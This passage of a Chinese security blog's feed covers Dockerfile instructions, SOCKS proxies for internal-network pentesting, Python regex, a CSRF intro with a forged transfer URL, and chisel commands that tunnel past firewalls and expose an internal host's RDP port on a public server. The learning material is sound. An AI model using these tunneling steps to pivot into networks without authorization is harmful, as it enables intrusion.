class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">RUN用于在镜像容器中执行命令，其有以下两种命令执行方式：</span><br><span class="line">shell执行</span><br><span class="line">RUN &lt;command&gt;</span><br><span class="line">exec执行</span><br><span class="line">RUN [&quot;executable&quot;, &quot;paraml&quot;, &quot;param2&quot;]</span><br><span class="line">RUN指令创建的中间镜像会被缓存，并会在下次构建中使用。如果不想使用这些缓存镜像，可以在构建时指定--no-cache参数，如：docker build --no-cache</span><br></pre></td></tr></table></figure><p>ADD: 将本地文件添加到容器中，tar类型文件会自动解压（网络压缩资源不会被解压），可以访问网络资源，类似wget</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ADD &lt;src&gt; ... &lt;dest&gt;</span><br><span class="line">ADD [&quot;&lt;src&gt;&quot;, ... &quot;&lt;dest&gt;&quot;] 用于支持包含空格的路径</span><br><span class="line">例：</span><br><span class="line">ADD hom* /mydir/  # 添加所有以 hom 开头的文件</span><br><span class="line">ADD hom?.txt /mydir/  # ?替代一个单字符，例如，home.txt</span><br><span class="line">ADD test mydir/  # 添加test到mydir</span><br></pre></td></tr></table></figure><p>COPY: 功能类似ADD，但是不会自动解压文件，也不能访问网络资源<br>CMD: 构建容器后调用，也就是在容器启动时才进行调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CMD [&quot;executable&quot;,&quot;param1&quot;,&quot;param2&quot;] # 执行可执行文件，优先</span><br><span class="line">CMD [&quot;param1&quot;,&quot;param2&quot;]  # 设置了ENTRYPOINT，则直接调用ENTRYPOINT添加参数</span><br><span class="line">CMD command param1 param2  # 执行shell内部命令</span><br><span class="line"></span><br><span class="line">CMD echo &quot;This is a test.&quot; | wc -</span><br><span class="line">CMD [&quot;/usr/bin/wc&quot;,&quot;--help&quot;]</span><br><span class="line"></span><br><span class="line">CMD不同于RUN，CMD用于指定在容器启动时所要执行的命令，而RUN用于指定镜像构建时所要执行的命令。</span><br></pre></td></tr></table></figure><p>ENTRYPOINT: 配置容器，使其可执行化。配合CMD可省去 application，只使用参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ENTRYPOINT [&quot;executable&quot;,&quot;param1&quot;,&quot;param2&quot;]  # 可执行文件，优先</span><br><span class="line">ENTRYPOINT command param1 param2  # shell内部命令</span><br><span class="line">ENTRYPOINT与CMD非常类似，不同的是通过docker run执行的命令不会覆盖ENTRYPOINT，而docker run命令中指定的任何参数，都会被当做参数再次传递给ENTRYPOINT。Dockerfile中只允许有一个ENTRYPOINT命令，多指定时会覆盖前面的设置，而只执行最后的ENTRYPOINT指令。</span><br></pre></td></tr></table></figure><p>LABEL: 用于为镜像添加元数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LABEL &lt;key&gt;=&lt;value&gt; &lt;key&gt;=&lt;value&gt; ...</span><br><span class="line">LABEL version=&quot;1.0&quot; description=&quot;this is a test&quot; by=&quot;ca5tle&quot;</span><br><span class="line">使用LABEL指定元数据时，一条LABEL指定可以指定一或多条元数据，指定多条元数据时不同元数据之间通过空格分隔。推荐所有的元数据通过一条LABEL指令指定，以免生成过多的中间镜像。</span><br></pre></td></tr></table></figure><p>ENV: 设置环境变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ENV &lt;key&gt; &lt;value&gt;  # &lt;key&gt;之后的所有内容均会被视为其&lt;value&gt;的组成部分，因此一次只能设置一个变量</span><br><span class="line">ENV &lt;key&gt;=&lt;value&gt; ... # 可以设置多个变量，每个变量为一个&lt;key&gt;=&lt;value&gt;的键值对，如果&lt;key&gt;中包含空格，可以使用 \ 来进行转义，也可以用&quot;&quot;表示，另外 \ 也可以用于续行</span><br></pre></td></tr></table></figure><p>EXPOSE: 指定外界交互的端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EXPOSE &lt;port&gt; [&lt;port&gt;...]</span><br><span class="line"></span><br><span class="line">EXPOSE并不会让容器的端口访问到主机。要使其可访问，需要在docker run运行容器时通过-p来映射端口</span><br></pre></td></tr></table></figure><p>VOLUME: 用于指定持久化目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">VOLUME [&quot;/path/to/dir&quot;]</span><br><span class="line">一个卷可以存在于一个或多个容器的指定目录，该目录可以绕过联合文件系统，并具有以下功能：</span><br><span class="line">1. 卷可以容器间共享和重用</span><br><span class="line">2. 容器并不一定要和其他容器共享卷</span><br><span class="line">3. 修改卷后会立即生效</span><br><span class="line">4. 对卷的修改不会对镜像产生影响</span><br><span class="line">5. 卷会一直存在，直到没有任何容器在使用它</span><br></pre></td></tr></table></figure><p>USER: 指定运行容器时的用户名或UID，后续的RUN也会使用指定用户。使用USER指定用户时，可以使用用户名、UID或GID，或者是两者组合。当服务不需要管理员权限时，可以通过该命令指定运行用户。并且可以在之前创建所需要的用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">USER user</span><br><span class="line">USER user:group</span><br><span class="line">USER uidU</span><br><span class="line">SER uid:gid</span><br><span class="line">USER user:gid</span><br><span class="line">USER uid:group</span><br><span class="line">使用USER指定用户后，Dockerfile中其后的命令RUN、CMD、ENTRYPOINT都将使用该用户。镜像构建完成后，通过docker run运行容器时，可以通过-u参数来覆盖所指定的用户。</span><br></pre></td></tr></table></figure><p>ARG: 用于指定传递给构建运行时的变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ARG &lt;name&gt;</span><br></pre></td></tr></table></figure><p>ONBUILD: 用于设置镜像触发器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ONBUILD [INSTRUCTION]</span><br><span class="line">例：</span><br><span class="line">ONBUILD ADD . /app/src</span><br><span class="line">当所构建的镜像被用做其它镜像的基础镜像，该镜像中的触发器将会被钥触发</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x00-写在前面&quot;&gt;&lt;a href=&quot;#0x00-写在前面&quot; class=&quot;headerlink&quot; title=&quot;0x00 写在前面&quot;&gt;&lt;/a&gt;0x00 写在前面&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/wt7018/p/</summary>
      
    
    
    
    <category term="Docker" scheme="http://lvpsectime.github.io/categories/Docker/"/>
    
    
    <category term="docker" scheme="http://lvpsectime.github.io/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>SOCKS代理</title>
    <link href="http://lvpsectime.github.io/2020/10/20/SOCKS%E4%BB%A3%E7%90%86/"/>
    <id>http://lvpsectime.github.io/2020/10/20/SOCKS%E4%BB%A3%E7%90%86/</id>
    <published>2020-10-20T11:40:26.000Z</published>
    <updated>2020-10-21T10:31:52.846Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>SOCKS是一种代理服务，可以简单地将一端的系统连接另一端。SOCKS支持多种协议，包括HTTP、FTP等。SOCKS分为SOCKS 4和SOCKS 5两种类型： SOCKS 4只支持TCP协议；SOCKS 5不仅支持TCP、UDP协议，还支持各种身份验证机制等，其标准端口为1080。SOCKS能够与目标内网计算机进行通信，避免多次使用端口转发。</p><p>SOCKS代理其实可以理解为加强版的lcx。它在服务端监听一个服务端口，当有新的连接请求出现时，会先从SOCKS协议中解析出目标的URL的目标端口，再执行lcx的具体功能。SOCKS代理工具有很多，在使用时尽可能选择没有GUI界面的。尽量选择不需要安装其他依赖软件的SOCKS代理工具，能够支持多平台的更好。</p><p>常见的内网渗透测试环境：<br>Internet –&gt; 防火墙 –&gt; 边界 –&gt; 防火墙 –&gt; 受限区域</p><h2 id="0x01-代理工具"><a href="#0x01-代理工具" class="headerlink" title="0x01 代理工具"></a>0x01 代理工具</h2><ol><li>EarthWorm</li><li>reGeorg</li><li>sSocks</li><li>SocksCap64</li><li>Proxifier</li><li>ProxyChains</li><li>chisel</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x00-简介&quot;&gt;&lt;a href=&quot;#0x00-简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 简介&quot;&gt;&lt;/a&gt;0x00 简介&lt;/h2&gt;&lt;p&gt;SOCKS是一种代理服务，可以简单地将一端的系统连接另一端。SOCKS支持多种协议，包括HTTP、F</summary>
      
    
    
    
    <category term="内网" scheme="http://lvpsectime.github.io/categories/%E5%86%85%E7%BD%91/"/>
    
    
    <category term="代理" scheme="http://lvpsectime.github.io/tags/%E4%BB%A3%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>Python正则表达式</title>
    <link href="http://lvpsectime.github.io/2020/10/20/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <id>http://lvpsectime.github.io/2020/10/20/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</id>
    <published>2020-10-20T07:31:02.000Z</published>
    <updated>2020-10-20T09:21:38.479Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-基础"><a href="#0x00-基础" class="headerlink" title="0x00 基础"></a>0x00 基础</h2><p>正则表达式是一种用来匹配字符串的强有力的武器。它的设计思想是用一种描述性的语言来给字符串定义一个规则，凡是符合规则的字符串，我们就认为它“匹配”了，否则，该字符串就是不合法的。</p><p>在正则表达式中，如果直接给出字符，就是精确匹配。用<code>\d</code>可以匹配一个数字，<code>\w</code>可以匹配一个字母或数字<br><code>&#39;00\d&#39;</code>可以匹配<code>&#39;002&#39;</code>、<code>&#39;003&#39;</code>等，但是无法匹配<code>&#39;00a&#39;</code><br><code>&#39;\d\d\d&#39;</code>可以匹配长度为3的字符串或数字，比如<code>&#39;123&#39;</code>、<code>&#39;111&#39;</code>等<br><code>&#39;\w\w\d&#39;</code>可以匹配长度为3的字符串，比如<code>&#39;aa1&#39;</code>、<code>&#39;ds0&#39;</code>等<br><code>.</code>可以匹配任意一个字符，比如<code>&#39;ab.&#39;</code>可以匹配<code>&#39;ab1&#39;</code>、<code>&#39;abd&#39;</code>等</p><p>要匹配变长的字符，<br>用<code>*</code>表示任意个字符，包括0个，<br>用<code>+</code>表示至少一个字符，<br>用<code>?</code>表示0个或1个字符，<br>用<code>&#123;n&#125;</code>表示n个字符，<br>用<code>&#123;n,m&#125;</code>表示n-m个字符</p><p>例如，<code>\d&#123;3&#125;\s+\d&#123;3,8&#125;</code></p><ul><li><code>\d&#123;3&#125;</code>代表3个数字</li><li><code>\s</code>代表匹配一个空格（包括Tab等空白符），所以<code>\s+</code>表示至少有一个空格</li><li><code>\d&#123;3,8&#125;</code>表示3到8个数字</li></ul><p>综上，上面的正则表达式可以匹配前面3个数字，中间至少一个空格，后面3到8个数字的字符串</p><p>如果要匹配特殊字符，比如<code>-</code>，需要用<code>\</code>转义，即<code>\-</code></p><h2 id="0x01-进阶"><a href="#0x01-进阶" class="headerlink" title="0x01 进阶"></a>0x01 进阶</h2><p>要做到更精确的匹配，可以用<code>[]</code>表示范围</p><ul><li><code>[0-9a-zA-Z\_]</code>可以匹配一个数字、或一个字母或者一个下划线</li><li><code>[0-9a-zA-Z\_]+</code>可以匹配至少由一个数字、字母或下划线组成的字符串</li><li><code>[a-zA-Z\_][0-9a-zA-Z\_]*</code>可以匹配由字母或下划线开头，后接任意个由一个数字、字母或下划线组成的字符串</li><li><code>[a-zA-Z\_][0-9a-zA-Z\_]&#123;0,19&#125;</code>更精确地限制了变量的长度是1-20个字符（前面一个字符+后面最多19个字符）</li></ul><p><code>A|B</code>可以匹配A或B<br><code>(P|p)ython</code>可以匹配<code>Python</code>或<code>python</code><br><code>^</code>表示行的开头，<code>^\d</code>表示必须以数字开头<br><code>$</code>表示行的结束，<code>\d$</code>表示必须以数字结尾</p><h2 id="0x02-re模块"><a href="#0x02-re模块" class="headerlink" title="0x02 re模块"></a>0x02 re模块</h2><p>下面用Python的re库使用正则表达式<br>由于Python的字符串本身也用<code>\</code>转义，所以要特别注意：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">str = &#x27;abc\\-111&#x27;</span><br><span class="line">print(str)</span><br><span class="line"></span><br><span class="line">结果： abc\-111</span><br></pre></td></tr></table></figure><p>所以我们可以使用<code>r</code>前缀，原始字符串，不用考虑转义的问题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">str = r&#x27;abc\-111&#x27;</span><br><span class="line">print(str)</span><br><span class="line"></span><br><span class="line">结果： abc-111</span><br></pre></td></tr></table></figure><p>判断正则表达式是否匹配</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import re</span><br><span class="line">&gt;&gt;&gt; re.match(r&#x27;^\d&#123;3&#125;\-\d&#123;3,8&#125;$&#x27;, &#x27;010-12345&#x27;)</span><br><span class="line">&lt;_sre.SRE_Match object; span=(0, 9), match=&#x27;010-12345&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; re.match(r&#x27;^\d&#123;3&#125;\-\d&#123;3,8&#125;$&#x27;, &#x27;010 12345&#x27;)</span><br></pre></td></tr></table></figure><p><code>match()</code>方法判断是否匹配，如果匹配成功，返回一个<code>Match</code>对象，否则返回<code>None</code>。常见的判断方法是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">test = &#x27;用户输入的字符串&#x27;</span><br><span class="line">if re.match(r&#x27;正则表达式&#x27;, test):</span><br><span class="line">    print(&#x27;ok&#x27;)</span><br><span class="line">else:</span><br><span class="line">    print(&#x27;failed&#x27;)</span><br></pre></td></tr></table></figure><h2 id="0x03-切分字符串"><a href="#0x03-切分字符串" class="headerlink" title="0x03 切分字符串"></a>0x03 切分字符串</h2><p>用正则表达式切片更加灵活</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#x27;a b     c&#x27;.split(&#x27; &#x27;)</span><br><span class="line">[&#x27;a&#x27;, &#x27;b&#x27;, &#x27;&#x27;, &#x27;&#x27;, &#x27;&#x27;, &#x27;&#x27;, &#x27;c&#x27;]</span><br></pre></td></tr></table></figure><p>无法识别连续的空格，用正则表达式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ss = &#x27;a b     c&#x27;</span><br><span class="line">res = re.split(r&#x27;\s+&#x27;, ss)</span><br><span class="line">print(res)</span><br><span class="line"></span><br><span class="line">结果： [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]</span><br></pre></td></tr></table></figure><p>切分空格、,</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ss = &#x27;a,b     c,d  e&#x27;</span><br><span class="line">res = re.split(r&#x27;[\s\,]+&#x27;, ss)</span><br><span class="line">print(res)</span><br><span class="line"></span><br><span class="line">结果： [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;]</span><br></pre></td></tr></table></figure><p>再加上<code>;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ss = &#x27;a,b     c;;d  e;test&#x27;</span><br><span class="line">res = re.split(r&#x27;[\s\,\;]+&#x27;, ss)</span><br><span class="line">print(res)</span><br><span class="line"></span><br><span class="line">结果： [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;test&#x27;]</span><br></pre></td></tr></table></figure><h2 id="0x04-分组"><a href="#0x04-分组" class="headerlink" title="0x04 分组"></a>0x04 分组</h2><p>提取子串<br>用<code>()</code>表示的就是要提取的分组(Group)。<br><code>^(\d&#123;3&#125;)-(\d&#123;3,8&#125;)$</code>分别定义了两个组，可以直接从匹配的字符串中提取出两个字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">str = &#x27;010-5832360&#x27;</span><br><span class="line">if re.match(r&#x27;^(\d&#123;3&#125;)-(\d&#123;3,8&#125;)$&#x27;, str):</span><br><span class="line">    print(&quot;匹配成功&quot;)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;匹配失败&quot;)</span><br><span class="line">res = re.match(r&#x27;^(\d&#123;3&#125;)-(\d&#123;3,8&#125;)$&#x27;, str)</span><br><span class="line">print(res.group(0))</span><br><span class="line">print(res.group(1))</span><br><span class="line">print(res.group(2))</span><br><span class="line"></span><br><span class="line">结果：</span><br><span class="line">匹配成功</span><br><span class="line">010-5832360</span><br><span class="line">010</span><br><span class="line">5832360</span><br></pre></td></tr></table></figure><p>如果正则表达式中定义了组，就可以在Match对象上用group()方法提取出子串来。</p><p>注意到group(0)永远是原始字符串，group(1)、group(2)……表示第1、2、……个子串。</p><h2 id="0x05-贪婪匹配"><a href="#0x05-贪婪匹配" class="headerlink" title="0x05 贪婪匹配"></a>0x05 贪婪匹配</h2><p>最后需要特别指出的是，正则匹配默认是贪婪匹配，也就是匹配尽可能多的字符。举例如下，匹配出数字后面的0：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; re.match(r&#x27;^(\d+)(0*)$&#x27;, &#x27;102300&#x27;).groups()</span><br><span class="line">(&#x27;102300&#x27;, &#x27;&#x27;)</span><br></pre></td></tr></table></figure><p>由于<code>\d+</code>采用贪婪匹配，直接把后面的0全部匹配了，结果<code>0*</code>只能匹配空字符串了。</p><p>必须让<code>\d+</code>采用非贪婪匹配（也就是尽可能少匹配），才能把后面的0匹配出来，加个<code>?</code>就可以让<code>\d+</code>采用非贪婪匹配：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; re.match(r&#x27;^(\d+?)(0*)$&#x27;, &#x27;102300&#x27;).groups()</span><br><span class="line">(&#x27;1023&#x27;, &#x27;00&#x27;)</span><br></pre></td></tr></table></figure><h2 id="0x06-写在最后"><a href="#0x06-写在最后" class="headerlink" title="0x06 写在最后"></a>0x06 写在最后</h2><p>正则表达式的内容绝不止这些，这些只是基本的用法。<br>后面会接着学习。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x00-基础&quot;&gt;&lt;a href=&quot;#0x00-基础&quot; class=&quot;headerlink&quot; title=&quot;0x00 基础&quot;&gt;&lt;/a&gt;0x00 基础&lt;/h2&gt;&lt;p&gt;正则表达式是一种用来匹配字符串的强有力的武器。它的设计思想是用一种描述性的语言来给字符串定义一个规则</summary>
      
    
    
    
    <category term="Python" scheme="http://lvpsectime.github.io/categories/Python/"/>
    
    
    <category term="python" scheme="http://lvpsectime.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>CSRF从0到1</title>
    <link href="http://lvpsectime.github.io/2020/05/22/CSRF%E4%BB%8E0%E5%88%B01/"/>
    <id>http://lvpsectime.github.io/2020/05/22/CSRF%E4%BB%8E0%E5%88%B01/</id>
    <published>2020-05-22T07:07:47.000Z</published>
    <updated>2020-07-09T00:03:03.927Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>CSRF (Cross-site request forgery，跨站请求伪造)也被称为 One Click Attack或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。与 XSS 不同的是，XSS利用站点内的信任用户，而CSRF通过伪装成受信任用户请求受信任的网站，也就是攻击者盗用你的身份，以你的名义发送恶意请求。</p><p>CSRF能够做的事情包括以目标用户的名义发送邮件、发消息，盗取目标用户的账号，甚至购买商品、虚拟货币转账等。</p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p><strong>举个例子</strong></p><p>你想给某用户转账100元，单击“转账”按钮之后，发出的HTTP请求会与<code>http://www.xxbank.com/pay.php?user=xx&amp;money=100</code>类似。攻击者构造链接<code>http://www.xxbank.com/pay.php?user=hacker&amp;money=100</code>，当目标用户访问了该URL后，就会自动向hacker账号转账100元，而且这只涉及目标用户的操作，攻击者并没有获取目标用户的cookie或其他信息。</p><p>CSRF攻击过程有两个重点：</p><ul><li>目标用户已经登录了网站，能够执行网站的功能</li><li>目标用户访问了攻击者构造的URL</li></ul><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;CSRF (Cross-site request forgery，跨站请求伪造)也被称为 One Click Attack或者Session</summary>
      
    
    
    
    <category term="WEB" scheme="http://lvpsectime.github.io/categories/WEB/"/>
    
    
    <category term="WEB" scheme="http://lvpsectime.github.io/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>chisel使用</title>
    <link href="http://lvpsectime.github.io/2020/05/17/chisel%E4%BD%BF%E7%94%A8/"/>
    <id>http://lvpsectime.github.io/2020/05/17/chisel%E4%BD%BF%E7%94%A8/</id>
    <published>2020-05-17T03:39:38.000Z</published>
    <updated>2020-05-17T09:23:07.418Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在练习靶场的时候了解到了这个工具，感觉挺好用的，所以就学习一下。</p><p>项目地址：<a href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a></p><p><strong>Chisel 是一款Go语言编写开源的通信加密的用于绕过防火墙使用 HTTP? 协议进行传输的快速 TCP 隧道工具</strong></p><p>特点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">- 使用方便</span><br><span class="line">- 高性能</span><br><span class="line">- 使用SSH协议的加密连接（通过crypto/ssh）</span><br><span class="line">- 支持身份验证</span><br><span class="line">- 客户端自动重新连接</span><br><span class="line">- 客户端可以通过一个 TCP 连接创建多个隧道</span><br><span class="line">- 客户端可以创建 HTTP CONNECT 代理</span><br><span class="line">- 服务端可选择兼作反向代理</span><br><span class="line">- 服务端可选择创建 SOCKS5 代理</span><br><span class="line">- 支持反向端口转发</span><br></pre></td></tr></table></figure><p>关键是<code>Chisel</code>的服务器端和客户端集成在一块，这就很方便了，不想<code>frp</code>还需要配置。</p><p>但是，<code>Chisel</code>的缺点就是，它的文件比较大。</p><h2 id="使用-Chisel-反弹-Socks5-代理"><a href="#使用-Chisel-反弹-Socks5-代理" class="headerlink" title="使用 Chisel 反弹 Socks5 代理"></a>使用 Chisel 反弹 Socks5 代理</h2><p><strong>公网主机上启动 chisel server</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chisel server -p 5555 --socks5  # 在本地 5555 端口启动 Socks5 服务</span><br></pre></td></tr></table></figure><p><strong>本地执行 chisel client</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chisel client IP:5555 socks</span><br></pre></td></tr></table></figure><h2 id="Chisel-进行端口映射"><a href="#Chisel-进行端口映射" class="headerlink" title="Chisel 进行端口映射"></a>Chisel 进行端口映射</h2><p><strong>公网主机上启动 chisel server</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chisel server -p 1337 --reverse</span><br></pre></td></tr></table></figure><p><strong>内网主机上启动 chisel client</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chisel client WANIP:1337 R:1234:LANIP:3389</span><br><span class="line">WANIP 是公网主机的公网 IP，LANIP 是内网主机的内网 IP</span><br></pre></td></tr></table></figure><p>如果 <code>server1</code> 上启动 <code>Chisel</code> 的 <code>client</code> 模式，且 <code>LANIP</code> 为 <code>server1</code> 的 <code>IP</code> 时，<code>server1</code> 的 <code>3389</code> 端口映射到了公网主机的 <code>1234</code> 端口</p><p><img src="https://xaaxblog.s3.amazonaws.com/2019-04-17-143105.jpg" alt="img"></p><p>如果 <code>server1</code> 上运行 <code>Chisel</code> 的 <code>client</code> 模式，但 <code>LANIP</code> 为 <code>server2</code> 的 <code>IP</code> 时，通过 <code>server1</code> 把<code>server2 </code>的 <code>3389</code> 端口映射到了公网主机的 <code>1234</code>端口</p><p><img src="https://xaaxblog.s3.amazonaws.com/2019-04-17-151947.jpg" alt="img"></p><p>从第二种用法可以看出 Chisel 的端口转发功能比 lcx 更强大</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://0xdf.gitlab.io/2019/01/28/tunneling-with-chisel-and-ssf.html">Tunneling with Chisel and SSF</a></p><p><a href="https://runsisi.com/2019-09-21/chisel-proxy">https://runsisi.com/2019-09-21/chisel-proxy</a></p><p><a href="https://runsisi.com/2019-09-20/chisel-reverse-proxy">https://runsisi.com/2019-09-20/chisel-reverse-proxy</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近在练习靶场的时候了解到了这个工具，感觉挺好用的，所以就学习一下。&lt;/p&gt;
&lt;p&gt;项目地址：&lt;a href=&quot;https://github</summary>
      
    
    
    
    <category term="Tools" scheme="http://lvpsectime.github.io/categories/Tools/"/>
    
    
    <category term="Tools" scheme="http://lvpsectime.github.io/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>ATT&amp;CK实战系列四</title>
    <link href="http://lvpsectime.github.io/2020/05/16/ATT-CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E5%9B%9B/"/>
    <id>http://lvpsectime.github.io/2020/05/16/ATT-CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E5%9B%9B/</id>
    <published>2020-05-16T08:17:49.000Z</published>
    <updated>2020-05-16T08:31:43.756Z</updated>
    
